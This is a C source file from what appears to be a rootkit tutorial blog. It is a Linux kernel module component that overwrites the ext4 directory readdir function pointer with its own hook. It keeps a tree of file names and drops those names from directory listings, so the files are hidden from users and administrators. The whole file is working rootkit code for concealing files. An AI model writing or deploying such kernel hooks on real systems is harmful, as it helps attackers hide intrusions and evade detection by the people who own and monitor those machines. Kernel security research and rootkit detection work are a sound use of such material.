// Beneath C Level - Rootkit tutorial
//
// ext4_ops.c - Manipulates the ext4 file_operations structure directly - so functionality can be re-routed
//
// Author: Nick Newson
// Website: http://beneathclevel.blogspot.co.uk/
//
// Tab size = 4

#include "ext4_ops.h"

#include "linux/rwlock_types.h"
#include <linux/slab.h>

#include "symbols.h"

// Type Declarations
typedef struct file_operations		file_operations;
typedef struct rb_node				rb_node;
typedef struct rb_root				rb_root;

// Type Defintiions
typedef	int							( *ext4_readdir_func )(
										file*					filp,
										void*					dirent, 
										filldir_t 				filldir );

typedef struct
{
	rb_node							node;
	char							name[]; // Variable length array support in C99
} km_hidden_file;

typedef struct
{
	void*							dirent;
	filldir_t						orig_filldir;
} km_ext4_filldir_data;

// Function Declarations
static int 							ext4_read_dir(
										file*					filp,
             							void*					dirent, 
										filldir_t 				filldir );

static int							ext4_filldir(
										void*					userdata,
										const char*				name,
										int						namlen,
										loff_t					offset,
										u64						ino,
										unsigned int			d_type );

static rb_node*						km_ext4_ops_find_file(
										const char* const		file );

// Globals
static file_operations*	const		g_ext4_dir_operations = ( file_operations* ) c_ext4_dir_operations_symbol;
static const ext4_readdir_func		g_orig_ext4_readdir = ( ext4_readdir_func ) c_ext4_readdir_symbol;

static 								DEFINE_RWLOCK( g_hidden_files_lock );
static rb_root						g_hidden_files = RB_ROOT;

// Function Definitions
void
km_ext4_ops_apply_readdir(
	void
)
{
	g_ext4_dir_operations->readdir = ext4_read_dir;
}

void
km_ext4_ops_remove_readdir(
	void
)
{
	g_ext4_dir_operations->readdir = g_orig_ext4_readdir;
}

void
km_ext4_ops_hide_file(
	const char* const       file
)
{
	// Check if it's already hidden...
	if ( !km_ext4_ops_find_file( file ) )
	{
		rb_node**			new;
		rb_node*			parent = NULL;

		// Allocate node with flexible array for string and null terminator
		km_hidden_file*		new_hidden_file = kmalloc( sizeof( km_hidden_file ) + strlen( file ) + 1, GFP_KERNEL );
		strcpy( new_hidden_file->name, file  );
	
		write_lock( &g_hidden_files_lock );
	
		new = &g_hidden_files.rb_node;
		while ( *new )
		{
			km_hidden_file*	hidden_file = rb_entry( *new, km_hidden_file, node );
			int				result = strcmp( file, hidden_file->name );

			parent = *new;

			if ( result < 0 )
			{
				new = &parent->rb_left;
			}
			else if ( result > 0 )
			{
				new = &parent->rb_right;
			}
			else
			{
				// Given we checked this file wasn't present...this should never happen	
				printk( KERN_ERR "km: Unable to add file '%s' to rbtree.\n", file );
				break;
			}
		}

		rb_link_node( &new_hidden_file->node, parent, new );
		rb_insert_color( &new_hidden_file->node, &g_hidden_files );
	
		write_unlock( &g_hidden_files_lock );
	}
}

void
km_ext4_ops_show_file(
	const char* const       file
)
{
	rb_node*				node = km_ext4_ops_find_file( file );

	// Check if it's not hidden...
	if ( node )
	{
		km_hidden_file*		hidden_file;

		write_lock( &g_hidden_files_lock );
		rb_erase( node, &g_hidden_files );
		write_unlock( &g_hidden_files_lock );
		
		hidden_file = rb_entry( node, km_hidden_file, node );
		kfree( hidden_file );
	}
}

int
km_ext4_ops_is_file_hidden(
	const char* const       file
)
{
	return km_ext4_ops_find_file( file ) != NULL;
}

static rb_node*							
km_ext4_ops_find_file(
	const char* const		file
)
{
	rb_node*				node = g_hidden_files.rb_node;

	read_lock( &g_hidden_files_lock );

	while ( node )
	{
		km_hidden_file*		hidden_file = rb_entry( node, km_hidden_file, node );
		int					result = strcmp( file, hidden_file->name );

		if ( result < 0 )
		{
			node = node->rb_left;
		}
		else if ( result > 0 )
		{
			node = node->rb_right;
		}
		else
		{
			// Found it
			break;
		}		
	}

	read_unlock( &g_hidden_files_lock );

	return node;
}

int
ext4_read_dir(
	file*					filp,
	void*					dirent, 
	filldir_t 				filldir
)
{
	const ext4_readdir_func	orig_func = g_orig_ext4_readdir;

	km_ext4_filldir_data	userdata = 
							{
								.dirent = dirent,
								.orig_filldir = filldir,	
							};

	int						result = orig_func( filp, &userdata, ext4_filldir );	

	return result;
}

static int
ext4_filldir(
	void*					__buf,
	const char*				name,
	int						namlen,
	loff_t					offset,
	u64						ino,
	unsigned int			d_type
)
{
	km_ext4_filldir_data*	userdata = __buf;

	if ( km_ext4_ops_is_file_hidden( name ) )
	{
		return 0;
	}

	return ( *userdata->orig_filldir )( userdata->dirent, name, namlen, offset, ino, d_type );
}
